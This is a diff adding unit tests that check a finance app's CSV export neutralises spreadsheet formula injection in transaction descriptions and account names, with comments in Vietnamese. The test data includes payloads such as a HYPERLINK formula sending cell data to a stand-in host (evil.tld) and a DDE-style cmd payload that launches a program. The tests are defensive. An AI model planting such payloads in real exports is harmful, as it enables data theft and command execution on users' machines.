@@ -146,6 +146,45 @@ describe('CSV Utilities', () => {
     })
   })
 
+  describe('CSV formula injection', () => {
+    const mk = (description: string): Transaction => ({
+      id: 'tx-1',
+      accountId: 'acc-1',
+      amount: -1000,
+      description,
+      type: 'expense',
+      status: 'posted',
+      transactionDate: '2026-03-09T10:00:00Z',
+    })
+
+    // description lấy nguyên văn từ SMS ngân hàng -> nội dung KHÔNG do ta kiểm soát.
+    // Excel đánh giá ô mở đầu bằng = + - @ như công thức, kể cả trong ô đã quote,
+    // nên papaparse quote KHÔNG chặn được. Xem neutralizeFormula() trong csv.ts.
+    it.each([
+      ['=HYPERLINK("http://evil.tld?d="&A1,"refund")'],
+      ["+cmd|' /C calc'!A0"],
+      ['-2+3+cmd'],
+      ['@SUM(1+1)'],
+      ['\tleading tab'],
+    ])('vô hiệu hoá công thức: %s', (payload) => {
+      const result = formatTransactionForCSV(mk(payload))
+      expect(result['Mô tả']).toBe(`'${payload}`)
+    })
+
+    it('KHÔNG đụng vào mô tả bình thường', () => {
+      expect(formatTransactionForCSV(mk('Cafe Highlands'))['Mô tả']).toBe('Cafe Highlands')
+      expect(formatTransactionForCSV(mk('Chuyen tien 500k'))['Mô tả']).toBe('Chuyen tien 500k')
+    })
+
+    it('sanitize cả tên tài khoản và danh mục', () => {
+      const result = formatTransactionForCSV(
+        mk('ok'),
+        { accountName: '=cmd' } as never
+      )
+      expect(result['Tài khoản']).toBe("'=cmd")
+    })
+  })
+
   describe('downloadCSV', () => {
     beforeEach(() => {
       vi.clearAllMocks()
